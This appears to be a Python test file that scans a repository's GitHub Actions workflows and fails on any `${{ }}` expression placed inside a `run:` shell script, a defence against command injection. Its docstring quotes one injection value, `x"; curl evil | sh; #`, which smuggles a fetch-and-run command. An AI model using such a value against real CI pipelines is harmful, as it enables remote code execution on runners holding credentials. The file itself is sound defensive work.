"""No workflow puts an expression into a shell line.

`${{ ... }}` in a `run:` script is substituted by Actions BEFORE bash parses
the line. For a free-text dispatch input such as `client`, a value like
`x"; curl evil | sh; #` then runs as a command on a runner that already holds
a WIF credential. Bound under `env:` and read as "$CLIENT", the same value is
only ever data. Seven workflows interpolated `inputs.client` until
2026-10-09; this checks every workflow, so the eighth cannot.
"""

import pathlib
import re
import unittest

WORKFLOWS = pathlib.Path(__file__).resolve().parents[2] / ".github" / "workflows"


def run_scripts(text):
    """Yield (line number, script text) for every `run:` in a workflow."""
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        m = re.match(r"^(\s*)(?:- )?run:\s*(.*)$", lines[i])
        if not m:
            i += 1
            continue
        indent, rest = len(m.group(1)), m.group(2)
        start = i + 1
        if re.fullmatch(r"[|>][+-]?\d*", rest.strip()):
            body = []
            i += 1
            while i < len(lines) and (not lines[i].strip()
                                      or len(lines[i]) - len(lines[i].lstrip()) > indent):
                body.append(lines[i])
                i += 1
            yield start, "\n".join(body)
        else:
            yield start, rest
            i += 1


class NoExpressionInAShellLine(unittest.TestCase):
    def test_the_scanner_finds_both_forms(self):
        sample = ("      - run: echo ${{ inputs.a }}\n"
                  "      - name: x\n"
                  "        run: >\n"
                  "          echo\n"
                  "          ${{ inputs.b }}\n"
                  "        env:\n"
                  "          C: ${{ inputs.c }}\n")
        found = [s for _, s in run_scripts(sample) if "${{" in s]
        self.assertEqual(len(found), 2)
        self.assertNotIn("inputs.c", "".join(found))

    def test_every_workflow(self):
        files = sorted(WORKFLOWS.glob("*.yml"))
        self.assertGreater(len(files), 5)
        for path in files:
            for line, script in run_scripts(path.read_text()):
                with self.subTest(workflow=path.name, line=line):
                    self.assertNotIn(
                        "${{", script,
                        f"{path.name}:{line} interpolates an expression into a "
                        f"shell line; bind it under env: and read it as \"$VAR\"")
